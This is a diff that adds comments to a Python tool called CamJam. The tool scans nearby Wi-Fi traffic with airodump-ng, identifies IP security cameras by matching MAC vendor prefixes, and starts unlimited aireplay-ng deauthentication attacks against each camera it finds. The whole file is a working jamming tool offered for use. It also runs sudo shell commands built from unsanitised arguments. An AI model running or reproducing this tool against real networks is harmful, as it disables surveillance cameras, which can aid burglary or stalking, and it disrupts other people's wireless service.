@@ -12,6 +12,7 @@ class CamJam:
 
     interfacescan = ''
     interfacedeauth = ''
+    ###                     This method handles the arguments passed to the script. It also defines the allowed arguments. 
     def parse_input(self):
         scrip_args_list = sys.argv[1:]
         short_options = "hs:d:"
@@ -40,7 +41,9 @@ class CamJam:
         except getopt.error as error:
             print(str(error))
             sys.exit(2)
+    ###
 
+    ###                     This method disables monitor mode on all interfaces in case this was still running (from previous runs for example), and restarts monitor mode for the scanning interface. 
     def enable_monitor_mode(self):
         try:
             subprocess.check_output('sudo airmon-ng stop '+self.interfacescan+ 'mon', shell=True)
@@ -52,9 +55,9 @@ class CamJam:
             pass
 
         commandstring = 'sudo airmon-ng start '+self.interfacescan
-
         try:
             process = subprocess.check_output(commandstring, shell=True)
+
             process = process.decode("utf-8")
             ifmon = self.interfacescan+"mon"
 
@@ -68,16 +71,18 @@ class CamJam:
         except subprocess.SubprocessError as error:
             print (str(error)+ " Is the supplied network adapter correct?")
             return 0
+    ###
 
+    ###                     This method detects devices, identifies cameras, and deauthenticates them. 
     def rundump(self):
         try:
-            os.system('rm airodumplogs-01.csv airodumplogs-01.log.csv airodumplogs-01.kismet.netxml airodumplogs-01.kismet.csv airodumplogs-01.cap')
+            os.system('rm airodumplogs-01.csv airodumplogs-01.log.csv airodumplogs-01.kismet.netxml airodumplogs-01.kismet.csv airodumplogs-01.cap')                        # Removes old Airodump-ng log files if these exist. 
         except:
             pass
         time.sleep(1)
 
         print ("starting airodump-ng on interface: "+ self.interfacescan)
-        airodumpprocess = subprocess.Popen(['airodump-ng', '-wairodumplogs', '-babg', '-a', self.interfacescan], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+        airodumpprocess = subprocess.Popen(['airodump-ng', '-wairodumplogs', '-babg', '-a', self.interfacescan], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)       # Starts Airodump-ng in order to start detecting devices. 
         print ('airodump-ng started, PID: '+ str(airodumpprocess.pid))
         time.sleep(1)
 
@@ -99,18 +104,18 @@ class CamJam:
                     macprefix = mac[0:8]
 
                     try:
-                        if ':' in x[5] and macprefix not in founddevices:
-                            founddevices.append(macprefix)
+                        if ':' in x[5] and macprefix not in founddevices:                                                   # Checks if device has already been detected. Skips it if this is the case. 
+                            founddevices.append(macprefix)                                                                  # Adds device to list so it will not be checked twice. 
 
                             with open('oui.txt', 'r') as ouifile:
                                 ouidata = ouifile.readlines()
                                 for ouirow in ouidata:
-                                    if ouirow.find(macprefix) != -1:
+                                    if ouirow.find(macprefix) != -1:                                                        #Checks if MAC OUI is present in the oui.txt file. 
 
                                         with open('vendors.txt', 'r') as vendorfile:
                                             vendordata = vendorfile.readlines()
                                             for vendorrow in vendordata:
-                                                if vendorrow.find(ouirow[18:]) != -1:
+                                                if vendorrow.find(ouirow[18:]) != -1:                                       # Checks if vendow is an camera manufacturer. 
                                                     try:
                                                         with open('airodumplogs-01.csv', 'r') as airodumplogs1:
                                                             datareader1 = csv.reader(airodumplogs1)
@@ -118,7 +123,7 @@ class CamJam:
                                                                 txt1 = str(datarow1)
                                                                 x1 = txt1.split(", ")
                                                                 if apmac in x1[0]:
-                                                                    channel = x1[3].replace(" ", "").replace("'", "")
+                                                                    channel = x1[3].replace(" ", "").replace("'", "")       # Retrieves AP channel for deauthentication.
                                                     except:
                                                         print("error")
                                                         pass
@@ -126,13 +131,13 @@ class CamJam:
                                                     mac = mac.replace("-", ":")
                                                     print ("New IP Camera found: "+ mac + " - " + apmac + " - " + channel)
 
-                                                    try:
+                                                    try:        # Will probably break when second camera is identified, not tested yet.
                                                         commandstring1 = 'sudo airmon-ng start '+self.interfacedeauth+ " " + channel
-                                                        process1 = subprocess.check_output(commandstring1, shell=True)
+                                                        process1 = subprocess.check_output(commandstring1, shell=True)      # Puts network interface on the correct channel for deauthentication. 
                                                         process1 = process1.decode("utf-8")
                                                         ifmon1 = self.interfacedeauth+"mon"
                                                         if ifmon1 in process1:
-                                                            aireplayprocess = subprocess.Popen(['aireplay-ng', '-0', '0', '-c'+ mac, '-a' + apmac, ifmon1], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT) #deauthhhhh
+                                                            aireplayprocess = subprocess.Popen(['aireplay-ng', '-0', '0', '-c'+ mac, '-a' + apmac, ifmon1], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)        # Starts deauth attack. 
                                                             print ("Started deauth attack: " + str(aireplayprocess.pid))
                                                             underattack.append(mac)
                                                             print("Currently under attack: "+str(underattack))
@@ -142,6 +147,7 @@ class CamJam:
                     except:
                         pass
             time.sleep(3)
+    ###
 
     def __init__(self):
         monmode_enabled=0
